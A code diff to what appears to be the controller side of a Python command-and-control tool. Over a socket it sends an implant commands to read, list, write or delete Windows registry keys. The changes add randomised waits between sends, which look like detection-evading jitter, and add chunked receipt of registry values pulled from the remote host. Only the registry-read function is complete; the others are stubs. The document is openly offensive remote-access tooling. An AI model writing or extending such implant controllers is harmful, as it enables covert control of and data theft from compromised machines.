@@ -10,7 +10,11 @@ REGREAD = 6
 REGLIST = 7
 REGWRITE = 8
 REGDELETE = 9
+import time 
+import random
 
+# How long we'd like to wait between sends 
+WAIT_TIME = random.randrange(1, 5)
 
 '''
 Description:
@@ -22,7 +26,8 @@ Returns:
 '''
 def printRegReadHelp():
     print("""Required params: \n
-                -filepath - Path where we would like to write our screenshot to locally \n""")
+                -keypath - Path to the registry key we'd like to read \n
+                -value - Name of the value we want to read\n""")
     return SUCCESS
 
 
@@ -41,25 +46,56 @@ def regRead(sock, keyPath, valueName):
         # First tell our implant we want to read a registry key 
         print("Sending command...")
         sock.send(bytes(str(REGREAD), "utf-8") + b'\x00')
+        time.sleep(WAIT_TIME)
 
         # Send key path to read
         print("Sending key path...")
         sock.send(keyPath + b'\x00')
+        time.sleep(WAIT_TIME)
 
         # Send value name to read
         print("Sending value name...")
         sock.send(valueName + b'\x00')
+        time.sleep(WAIT_TIME)
 
         # Receiving key value here... probably need a size first 
-        data = sock.recv(1024)
+        data = sock.recv(7)
         data = data.strip()
         data = data.decode('utf-8')
 
         if (data == "SUCCESS"):
-            print("Successful reg read file!\n")
+            print("Successful reg read file! Getting key size...")
+
+            data = sock.recv(4) 
+
+            keySize = int.from_bytes(data, 'little')
+
+            print("Key data is %i bytes; Receiving data... " % keySize)
+            
+            data = b''
+            dataRead = 0
+
+            # Sockets are sometimes annoying and weird (and fragile)
+            while(dataRead < keySize):
+                # Either adding 1024 is going to keep us under our key size or...
+                if (dataRead + 1024 <= keySize):
+                    sockData = sock.recv(1024)
+                    data += sockData
+                # Grabing 1024 will be too much so just grab the difference
+                else:
+                    dataToRead = keySize - dataRead
+                    sockData = sock.recv(dataToRead)
+                    data += sockData
+                dataRead = len(data)
+
+            # TODO: this can easily be modified to print according to data type return; currently will only handle strings (well)
+            print("Key %s with value %s returned: %s\n" % (keyPath.decode('utf-8'), valueName.decode('utf-8'), data.decode('utf-8')))
+            #print("Key %s with value %s returned: %s\n" % (keyPath.decode('utf-8'), valueName.decode('utf-8'), data))
 
         else:
             print("Implant returned FAILURE!\n")
+            print(data)
+            return FAILURE
 
         return SUCCESS
     
@@ -67,9 +103,7 @@ def regRead(sock, keyPath, valueName):
         print("ERROR: Could not send reg read to implant: ", e)
         return FAILURE
     
-    return SUCCESS
-
-
+    
 def regList():
     try:
 
@@ -79,7 +113,6 @@ def regList():
         print("ERROR: Could not send reg list to implant: ", e)
         return FAILURE
     
-    return SUCCESS
 
 def regWrite():
     try:
@@ -90,7 +123,6 @@ def regWrite():
         print("ERROR: Could not send reg write to implant: ", e)
         return FAILURE
     
-    return SUCCESS
 
 def regDelete():
     try:
@@ -101,4 +133,3 @@ def regDelete():
         print("ERROR: Could not send reg delete to implant: ", e)
         return FAILURE
     
-    return SUCCESS
